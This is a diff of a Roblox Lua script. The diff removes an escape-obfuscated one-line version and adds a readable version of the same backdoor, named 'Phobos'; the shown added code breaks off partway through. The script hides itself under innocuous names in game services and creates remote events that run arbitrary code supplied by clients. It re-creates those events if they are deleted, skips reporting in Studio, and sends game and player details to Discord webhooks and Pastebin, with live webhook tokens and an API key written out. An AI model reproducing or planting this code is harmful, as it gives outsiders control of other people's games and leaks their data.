@@ -1,1 +1,490 @@
-local a = "\49\46\50" local b = "\104\116\116\112\115\58\47\47\119\101\98\104\111\111\107\46\108\101\119\105\115\97\107\117\114\97\46\109\111\101\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\56\56\48\52\57\57\49\50\55\57\56\55\56\57\54\52\51\47\50\51\101\51\74\118\65\70\45\69\104\48\86\121\121\105\56\103\80\108\80\89\69\117\73\118\102\108\105\68\98\48\54\76\118\51\118\87\82\89\79\105\108\112\106\120\79\53\109\68\103\73\53\54\101\116\120\79\119\71\107\70\97\76\111\82\86\73" local c = "\104\116\116\112\115\58\47\47\119\101\98\104\111\111\107\46\108\101\119\105\115\97\107\117\114\97\46\109\111\101\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\48\56\55\48\50\51\53\52\49\54\50\48\51\49\52\50\53\51\47\51\65\116\45\90\76\117\55\98\68\107\87\95\75\76\83\86\71\48\68\95\87\48\83\84\122\55\67\111\95\104\99\79\50\103\116\71\52\70\114\82\103\51\45\90\55\97\82\74\118\53\56\51\57\89\70\112\119\86\120\80\52\69\80\80\70\99\109" local d = {} local e = math.random(0,4) function f() local g = Instance.new("\70\111\108\100\101\114") g.Parent = game:GetService("\67\104\97\116") g.Name = "\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101" local h = Instance.new("\77\111\100\117\108\101\83\99\114\105\112\116") h.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") h.Name = "\85\116\105\108\105\116\101\115" local i = Instance.new("\77\111\100\117\108\101\83\99\114\105\112\116") i.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") i.Name = "\83\101\114\118\105\99\101" local j = Instance.new("\77\111\100\117\108\101\83\99\114\105\112\116") j.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") j.Name = "\67\104\97\116\83\101\114\118\105\99\101" local k = Instance.new("\77\111\100\117\108\101\83\99\114\105\112\116") k.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") k.Name = "\76\111\99\97\108\105\122\97\116\105\111\110" local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") l.Name = "\70\105\108\116\101\114\77\101\115\115\97\103\101" script.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") script.Name = "\67\104\97\116\82\117\110\110\101\114" function m() local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") l.Name = "\70\105\108\116\101\114\77\101\115\115\97\103\101" end local n = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local o = require(10131117731) local p = pcall(function() game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):RequestAsync({Url = "\104\116\116\112\115\58\47\47\103\111\111\103\108\101\46\99\111\109", Method = "\71\69\84"}) end) function q() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\226\157\149\78\101\119\32\71\97\109\101\226\157\149"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\71\97\109\101\32\78\97\109\101\58\32\42\42\32"..game.Name.."\92\110\92\110\42\42\71\97\109\101\32\76\105\110\107\58\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\103\97\109\101\115\47"..game.PlaceId.."\92\110\92\110\42\42\80\108\97\121\101\114\115\58\32\42\42"..game:GetService("\80\108\97\121\101\114\115"):GetChildren().."\92\110\92\110\42\42\67\114\101\97\116\111\114\58\32\42\42"..game:GetService("\80\108\97\121\101\114\115"):GetNameFromUserIdAsync(game.CreatorId).."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a.."\92\110\92\110\32\60\64\38\49\48\56\55\48\53\56\57\48\50\57\51\55\53\49\56\48\56\48\62", ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(b,s) end local t, u = pcall(function() function v() if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() == false then if game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") then if game.GameId == 0 then else q() return end else return end end end end) if p == false then l:FireClient() else v() end l.OnServerEvent:Connect(function(w,x,y) for z, A in pairs(d) do if A == w.UserId then w:Kick('\89\111\117\32\97\114\101\32\110\111\116\32\97\108\108\111\119\101\100\32\116\111\32\117\115\101\32\80\104\111\98\111\115') end end local B = function() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\68\101\116\101\99\116\101\100\32\85\115\101\114"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\85\115\101\114\110\97\109\101\58\42\42\32"..w.Name.."\92\110\92\110\42\42\76\105\110\107\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\117\115\101\114\115\47"..w.UserId.."\47\112\114\111\102\105\108\101".."\92\110\92\110\42\42\84\114\105\101\100\32\101\120\101\99\117\116\105\110\103\58\32\42\42".."\96"..x.."\96".."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a, ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(c,s) end local C, D = pcall(function()  if y == "\82\101\115\112\97\119\110" then local C, D = pcall(function()  w:LoadCharacter() end) elseif y == "\82\54" then local C, D = pcall(function()  require(10796895415).load(w.Name) end) end local C, D = pcall(function() o(x)() end) end) end) local t, u = pcall(function() game:GetService("\67\104\97\116"):FindFirstChild("\67\104\97\116\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101").DescendantRemoving:Connect(function(E) if E.Name == "\70\105\108\116\101\114\77\101\115\115\97\103\101" then m() return end end) end) end function F() local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\73\110\115\101\114\116\83\101\114\118\105\99\101") l.Name = "\73\110\115\101\114\116\77\111\100\101\108\115" script.Parent = game:GetService("\73\110\115\101\114\116\83\101\114\118\105\99\101") script.Name = "\70\114\97\109\101\119\111\114\107" function m() local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\73\110\115\101\114\116\83\101\114\118\105\99\101") l.Name = "\73\110\115\101\114\116\77\111\100\101\108\115" end local n = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local o = require(10131117731) function G(H, I) local J = H for z = 1, #I do if J <= I[z] then return z, J else J = J - I[z] end end end function K() local I = {31, 28, 31, 30, 31, 30, 31,31,30, 31, 30, 31} local L, M = "\69\83\84", -4 local N = os.time()+(3600*M) local O = math.floor(N/31557600) local P = O-30 local H =  math.floor((N-(O*(31557600)))/86400)+1 if P/4-math.floor(P/4) == 0 then I[2] = 29 end local Q, R = G(H, I) local S = math.floor((N-((math.floor(N/86400))*86400))/3600) local T = math.floor((N-((math.floor(N/3600))*3600))/60) local U = math.floor((N-((math.floor(N/60))*60))) if string.len(S)==1 then S = "\48"..S end if string.len(T)==1 then T = "\48"..T end if string.len(U)==1 then U = "\48"..U end return Q.."\47"..R.."\47"..P end local V = game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset) local W = game:GetService("\80\108\97\121\101\114\115"):GetChildren() local X = 19 local Y = os.date("\33\42\116") local aa = (Y.hour + X) % 24 local ba = aa < 12 and "\65\77" or "\80\77" local ca = string.format("\37\48\50\105\58\37\48\50\105\32\37\115", ((aa - 1) % 12) + 1, Y.min, ba) local n = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local da = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\97\112\105\47\97\112\105\95\112\111\115\116\46\112\104\112" local ea = { ["\97\112\105\95\100\101\118\95\107\101\121"] = "\70\115\54\113\50\66\69\52\73\51\84\57\77\109\82\120\115\54\70\48\120\111\120\74\112\57\105\52\112\80\67\120", ["\97\112\105\95\111\112\116\105\111\110"] = "\112\97\115\116\101", ["\97\112\105\95\112\97\115\116\101\95\110\97\109\101"] = V.Name.."\32\40\80\104\111\98\111\115\41", ["\97\112\105\95\112\97\115\116\101\95\99\111\100\101"] = "\71\97\109\101\32\78\97\109\101\58\32"..V.Name.."\92\110\92\110\71\97\109\101\32\76\105\110\107\58\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\103\97\109\101\115\47"..game.PlaceId.."\92\110\92\110\67\114\101\97\116\111\114\58\32"..game:GetService("\80\108\97\121\101\114\115"):GetNameFromUserIdAsync(game.CreatorId).."\92\110\92\110\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32"..a.."\92\110\92\110\84\105\109\101\32\40\69\97\115\116\101\114\110\32\83\116\97\110\100\97\114\100\32\84\105\109\101\41\58\32"..ca.."\92\110\92\110\68\97\116\101\58\32"..K(), ["\97\112\105\95\112\97\115\116\101\95\102\111\114\109\97\116"] = "\116\101\120\116", ["\97\112\105\95\112\97\115\116\101\95\101\120\112\105\114\101\95\100\97\116\101"] = "\49\89", ["\97\112\105\95\112\97\115\116\101\95\112\114\105\118\97\116\101"] = "\49", ["\97\112\105\95\117\115\101\114\95\107\101\121"] = "", } local r = "" for fa, ga in pairs(ea) do r = r .. ("\38\37\115\61\37\115"):format(n:UrlEncode(fa), n:UrlEncode(ga)) end r = r:sub(2)  local ha = n:PostAsync(da, r, Enum.HttpContentType.ApplicationUrlEncoded, false) local p = pcall(function() game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):RequestAsync({Url = "\104\116\116\112\115\58\47\47\103\111\111\103\108\101\46\99\111\109", Method = "\71\69\84"}) end) function q() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\226\157\149\78\101\119\32\71\97\109\101\226\157\149"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\71\97\109\101\32\78\97\109\101\58\32\42\42\32"..V.Name.."\92\110\92\110\42\42\71\97\109\101\32\76\105\110\107\58\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\103\97\109\101\115\47"..game.PlaceId.."\92\110\92\110\42\42\80\108\97\121\101\114\115\58\32\42\42"..#W.."\92\110\92\110\42\42\67\114\101\97\116\111\114\58\32\42\42"..game:GetService("\80\108\97\121\101\114\115"):GetNameFromUserIdAsync(game.CreatorId).."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a.."\92\110\92\110\42\42\65\114\99\104\105\118\101\32\76\105\110\107\32\40\80\65\83\84\69\66\73\78\41\58\32\42\42"..ha.."\92\110\92\110\32\60\64\38\49\48\56\55\48\53\56\57\48\50\57\51\55\53\49\56\48\56\48\62", ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(b,s) end local t, u = pcall(function() function v() if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() == false then if game:GetService("\73\110\115\101\114\116\83\101\114\118\105\99\101"):FindFirstChild("\73\110\115\101\114\116\77\111\100\101\108\115") then if game.GameId == 0 then else q() return end else return end end end end) if p == false then l:FireClient() else v() end l.OnServerEvent:Connect(function(w,x,y) for z, A in pairs(d) do if A == w.UserId then w:Kick('\89\111\117\32\97\114\101\32\110\111\116\32\97\108\108\111\119\101\100\32\116\111\32\117\115\101\32\80\104\111\98\111\115') end end local B = function() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\68\101\116\101\99\116\101\100\32\85\115\101\114"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\85\115\101\114\110\97\109\101\58\42\42\32"..w.Name.."\92\110\92\110\42\42\76\105\110\107\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\117\115\101\114\115\47"..w.UserId.."\47\112\114\111\102\105\108\101".."\92\110\92\110\42\42\84\114\105\101\100\32\101\120\101\99\117\116\105\110\103\58\32\42\42".."\96"..x.."\96".."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a, ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(c,s) end local C, D = pcall(function()  if y == "\82\101\115\112\97\119\110" then local C, D = pcall(function()  w:LoadCharacter() end) elseif y == "\82\54" then local C, D = pcall(function()  require(10796895415).load(w.Name) end) end local C, D = pcall(function() o(x)() end) end) end) local t, u = pcall(function() game:GetService("\73\110\115\101\114\116\83\101\114\118\105\99\101"):FindFirstChild("\73\110\115\101\114\116\77\111\100\101\108\115").DescendantRemoving:Connect(function(E) if E.Name == "\73\110\115\101\114\116\77\111\100\101\108\115" then m() return end end) end) end function ia() local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") l.Name = "\84\114\97\110\115\108\97\116\101" script.Parent = game:GetService("\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") script.Name = "\77\97\105\110" function m() local l = Instance.new("\82\101\109\111\116\101\69\118\101\110\116") l.Parent = game:GetService("\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101") l.Name = "\84\114\97\110\115\108\97\116\101" end local n = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local o = require(10131117731) function G(H, I) local J = H for z = 1, #I do if J <= I[z] then return z, J else J = J - I[z] end end end function K() local I = {31, 28, 31, 30, 31, 30, 31,31,30, 31, 30, 31} local L, M = "\69\83\84", -4 local N = os.time()+(3600*M) local O = math.floor(N/31557600) local P = O-30 local H =  math.floor((N-(O*(31557600)))/86400)+1 if P/4-math.floor(P/4) == 0 then I[2] = 29 end local Q, R = G(H, I) local S = math.floor((N-((math.floor(N/86400))*86400))/3600) local T = math.floor((N-((math.floor(N/3600))*3600))/60) local U = math.floor((N-((math.floor(N/60))*60))) if string.len(S)==1 then S = "\48"..S end if string.len(T)==1 then T = "\48"..T end if string.len(U)==1 then U = "\48"..U end return Q.."\47"..R.."\47"..P end local V = game:GetService("\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset) local W = game:GetService("\80\108\97\121\101\114\115"):GetChildren() local X = 19 local Y = os.date("\33\42\116") local aa = (Y.hour + X) % 24 local ba = aa < 12 and "\65\77" or "\80\77" local ca = string.format("\37\48\50\105\58\37\48\50\105\32\37\115", ((aa - 1) % 12) + 1, Y.min, ba) local n = game:GetService("\72\116\116\112\83\101\114\118\105\99\101") local da = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\97\112\105\47\97\112\105\95\112\111\115\116\46\112\104\112" local ea = { ["\97\112\105\95\100\101\118\95\107\101\121"] = "\70\115\54\113\50\66\69\52\73\51\84\57\77\109\82\120\115\54\70\48\120\111\120\74\112\57\105\52\112\80\67\120", ["\97\112\105\95\111\112\116\105\111\110"] = "\112\97\115\116\101", ["\97\112\105\95\112\97\115\116\101\95\110\97\109\101"] = V.Name.."\32\40\80\104\111\98\111\115\41", ["\97\112\105\95\112\97\115\116\101\95\99\111\100\101"] = "\71\97\109\101\32\78\97\109\101\58\32"..V.Name.."\92\110\92\110\71\97\109\101\32\76\105\110\107\58\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\103\97\109\101\115\47"..game.PlaceId.."\92\110\92\110\67\114\101\97\116\111\114\58\32"..game:GetService("\80\108\97\121\101\114\115"):GetNameFromUserIdAsync(game.CreatorId).."\92\110\92\110\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32"..a.."\92\110\92\110\84\105\109\101\32\40\69\97\115\116\101\114\110\32\83\116\97\110\100\97\114\100\32\84\105\109\101\41\58\32"..ca.."\92\110\92\110\68\97\116\101\58\32"..K(), ["\97\112\105\95\112\97\115\116\101\95\102\111\114\109\97\116"] = "\116\101\120\116", ["\97\112\105\95\112\97\115\116\101\95\101\120\112\105\114\101\95\100\97\116\101"] = "\49\89", ["\97\112\105\95\112\97\115\116\101\95\112\114\105\118\97\116\101"] = "\49", ["\97\112\105\95\117\115\101\114\95\107\101\121"] = "", } local r = "" for fa, ga in pairs(ea) do r = r .. ("\38\37\115\61\37\115"):format(n:UrlEncode(fa), n:UrlEncode(ga)) end r = r:sub(2)  local ha = n:PostAsync(da, r, Enum.HttpContentType.ApplicationUrlEncoded, false) local p = pcall(function() game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):RequestAsync({Url = "\104\116\116\112\115\58\47\47\103\111\111\103\108\101\46\99\111\109", Method = "\71\69\84"}) end) function q() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\226\157\149\78\101\119\32\71\97\109\101\226\157\149"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\71\97\109\101\32\78\97\109\101\58\32\42\42\32"..V.Name.."\92\110\92\110\42\42\71\97\109\101\32\76\105\110\107\58\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\103\97\109\101\115\47"..game.PlaceId.."\92\110\92\110\42\42\80\108\97\121\101\114\115\58\32\42\42"..#W.."\92\110\92\110\42\42\67\114\101\97\116\111\114\58\32\42\42"..game:GetService("\80\108\97\121\101\114\115"):GetNameFromUserIdAsync(game.CreatorId).."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a.."\92\110\92\110\42\42\65\114\99\104\105\118\101\32\76\105\110\107\32\40\80\65\83\84\69\66\73\78\41\58\32\42\42"..ha.."\92\110\92\110\32\60\64\38\49\48\56\55\48\53\56\57\48\50\57\51\55\53\49\56\48\56\48\62", ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(b,s) end local t, u = pcall(function() function v() if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() == false then if game:GetService("\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101"):FindFirstChild("\84\114\97\110\115\108\97\116\101") then if game.GameId == 0 then else q() return end else return end end end end) if p == false then l:FireClient() else v() end l.OnServerEvent:Connect(function(w,x,y) for z, A in pairs(d) do if A == w.UserId then w:Kick('\89\111\117\32\97\114\101\32\110\111\116\32\97\108\108\111\119\101\100\32\116\111\32\117\115\101\32\80\104\111\98\111\115') end end local B = function() local r = { ["\101\109\98\101\100\115"] = {{ ["\116\105\116\108\101"] = "\68\101\116\101\99\116\101\100\32\85\115\101\114"; ["\100\101\115\99\114\105\112\116\105\111\110"] = "\92\110\42\42\85\115\101\114\110\97\109\101\58\42\42\32"..w.Name.."\92\110\92\110\42\42\76\105\110\107\32\42\42\32".."\104\116\116\112\115\58\47\47\119\119\119\46\114\111\98\108\111\120\46\99\111\109\47\117\115\101\114\115\47"..w.UserId.."\47\112\114\111\102\105\108\101".."\92\110\92\110\42\42\84\114\105\101\100\32\101\120\101\99\117\116\105\110\103\58\32\42\42".."\96"..x.."\96".."\92\110\92\110\42\42\66\97\99\107\100\111\111\114\32\86\101\114\115\105\111\110\58\32\42\42"..a, ["\116\104\117\109\98\110\97\105\108"] = {url="\104\116\116\112\115\58\47\47\99\100\110\46\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\116\116\97\99\104\109\101\110\116\115\47\49\48\49\54\52\49\49\52\51\53\56\55\53\55\49\51\48\55\52\47\49\48\50\48\56\50\55\55\52\54\50\48\50\53\53\52\51\54\56\47\78\101\119\95\71\97\109\101\46\112\110\103"}, ["\99\111\108\111\114"] = tonumber(0x00b3ff); }} } local s = n:JSONEncode(r) n:PostAsync(c,s) end local C, D = pcall(function()  if y == "\82\101\115\112\97\119\110" then local C, D = pcall(function()  w:LoadCharacter() end) elseif y == "\82\54" then local C, D = pcall(function()  require(10796895415).load(w.Name) end) end local C, D = pcall(function() o(x)() end) end) end) local t, u = pcall(function() game:GetService("\76\111\99\97\108\73\122\97\116\105\111\110\83\101\114\118\105\99\101").DescendantRemoving:Connect(function(E) if E.Name == "\84\114\97\110\115\108\97\116\101" then m() return end end) end) end if e == 1 then F() elseif e == 2 then warn("\105\116\115\32\50\33\32\98\101\102\111\114\101") F() warn("\105\116\115\32\50\33\32\97\102\116\101\114") elseif e == 3 then warn("\105\116\115\32\51\33\32\98\101\102\111\114\101") ia() warn("\105\116\115\32\51\33\32\97\102\116\101\114") elseif e == 0 then warn("\105\116\115\32\52\33\32\98\101\102\111\114\101") F() warn("\105\116\115\32\52\33\32\97\102\116\101\114") elseif e == 4 then ia() end
+--[[
+oh no
+
+--]]
+
+local BDV = "1.2"
+
+local hook2 = "https://webhook.lewisakura.moe/api/webhooks/1088049912798789643/23e3JvAF-Eh0Vyyi8gPlPYEuIvfliDb06Lv3vWRYOilpjxO5mDgI56etxOwGkFaLoRVI"
+local hook3 = "https://webhook.lewisakura.moe/api/webhooks/1087023541620314253/3At-ZLu7bDkW_KLSVG0D_W0STz7Co_hcO2gtG4FrRg3-Z7aRJv5839YFpwVxP4EPPFcm"
+
+local BlacklistedUsers = {}
+local ChosenLocationNumber = math.random(0,4)
+
+function Start1()
+	local MainFol = Instance.new("Folder")
+	MainFol.Parent = game:GetService("Chat")
+	MainFol.Name = "ChatLocalizationService"
+
+	local Module1 = Instance.new("ModuleScript")
+	Module1.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Module1.Name = "Utilites"
+
+	local Module2 = Instance.new("ModuleScript")
+	Module2.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Module2.Name = "Service"
+
+	local Module3 = Instance.new("ModuleScript")
+	Module3.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Module3.Name = "ChatService"
+
+	local Module4 = Instance.new("ModuleScript")
+	Module4.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Module4.Name = "Localization"
+
+
+	local Event = Instance.new("RemoteEvent")
+	Event.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	Event.Name = "FilterMessage"
+
+	script.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+	script.Name = "ChatRunner"
+
+	--
+	function ReInsert()
+		local Event = Instance.new("RemoteEvent")
+		Event.Parent = game:GetService("Chat"):FindFirstChild("ChatLocalizationService")
+		Event.Name = "FilterMessage"
+	end
+
+	--
+	local HttpService = game:GetService("HttpService")
+
+	local phobos = require(10131117731)
+
+	local isHttpEnabled = pcall(function()
+		game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
+	end)
+
+	function Upload()
+		local data = {
+			["embeds"] = {{
+				["title"] = "❕New Game❕";
+				["description"] = "\n**Game Name: ** "..game.Name.."\n\n**Game Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Players: **"..game:GetService("Players"):GetChildren().."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Backdoor Version: **"..BDV.."\n\n <@&1087058902937518080>",
+				["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+				["color"] = tonumber(0x00b3ff);
+			}}
+		}
+		local data2 = HttpService:JSONEncode(data)
+		HttpService:PostAsync(hook2,data2)
+	end
+
+	local success1, result1 = pcall(function()
+		function Check()
+			if game:GetService("RunService"):IsStudio() == false then
+				if game:GetService("Chat"):FindFirstChild("ChatLocalizationService") then
+					if game.GameId == 0 then
+						--Upload()
+						--http hook wont post because the game id is 0
+					else
+						Upload()
+						return
+					end
+
+				else
+
+					return
+				end
+			end
+		end
+	end)
+
+	if isHttpEnabled == false then
+		Event:FireClient()
+	else
+		Check()
+	end
+
+	Event.OnServerEvent:Connect(function(plr,lol,Other)
+		for i, Blacklisted in pairs(BlacklistedUsers) do
+			if Blacklisted == plr.UserId then
+				plr:Kick('You are not allowed to use Phobos')
+			end
+		end
+		local upload2 = function()
+			local data = {
+				["embeds"] = {{
+					["title"] = "Detected User";
+					["description"] = "\n**Username:** "..plr.Name.."\n\n**Link ** ".."https://www.roblox.com/users/"..plr.UserId.."/profile".."\n\n**Tried executing: **".."`"..lol.."`".."\n\n**Backdoor Version: **"..BDV,
+					["thumbnail"] = {url="https://cdn.discordapp.com/attachments/1016411435875713074/1020827746202554368/New_Game.png"},
+					["color"] = tonumber(0x00b3ff);
+				}}
+			}
+			local data2 = HttpService:JSONEncode(data)
+			HttpService:PostAsync(hook3,data2)
+		end
+		local success, result = pcall(function() 
+			if Other == "Respawn" then
+				local success, result = pcall(function() 
+					plr:LoadCharacter()
+				end)
+			elseif Other == "R6" then
+				local success, result = pcall(function() 
+					require(10796895415).load(plr.Name)
+				end)
+			end
+			local success, result = pcall(function()
+					phobos(lol)()
+				end)
+		end)
+	end)
+	local success1, result1 = pcall(function()
+		game:GetService("Chat"):FindFirstChild("ChatLocalizationService").DescendantRemoving:Connect(function(event1)
+			if event1.Name == "FilterMessage" then
+				ReInsert()
+				return
+			end
+		end)
+	end)
+
+end
+
+function Start2()
+	local Event = Instance.new("RemoteEvent")
+	Event.Parent = game:GetService("InsertService")
+	Event.Name = "InsertModels"
+
+	script.Parent = game:GetService("InsertService")
+	script.Name = "Framework"
+
+	--
+	function ReInsert()
+		local Event = Instance.new("RemoteEvent")
+		Event.Parent = game:GetService("InsertService")
+		Event.Name = "InsertModels"
+	end
+
+	--
+	local HttpService = game:GetService("HttpService")
+
+	local phobos = require(10131117731)
+
+	function getMonth(DoTy, months)
+		local var2 = DoTy
+		for i = 1, #months do
+			if var2 <= months[i] then return i, var2 else var2 = var2 - months[i] end
+		end
+	end
+
+	function dateTime()
+		local months = {31, 28, 31, 30, 31, 30, 31,31,30, 31, 30, 31}
+		local timezone, offset_hours = "EST", -4
+		local secondspassed = os.time()+(3600*offset_hours)
+		local yearspassed = math.floor(secondspassed/31557600)
+		local YoTc = yearspassed-30
+		local DoTy =  math.floor((secondspassed-(yearspassed*(31557600)))/86400)+1
+		if YoTc/4-math.floor(YoTc/4) == 0 then months[2] = 29 end
+		local MoTy, DoTm = getMonth(DoTy, months)
+		local HR = math.floor((secondspassed-((math.floor(secondspassed/86400))*86400))/3600)
+		local MIN = math.floor((secondspassed-((math.floor(secondspassed/3600))*3600))/60)
+		local SEC = math.floor((secondspassed-((math.floor(secondspassed/60))*60)))
+		if string.len(HR)==1 then HR = "0"..HR end
+		if string.len(MIN)==1 then MIN = "0"..MIN end
+		if string.len(SEC)==1 then SEC = "0"..SEC end
+		return MoTy.."/"..DoTm.."/"..YoTc
+	end
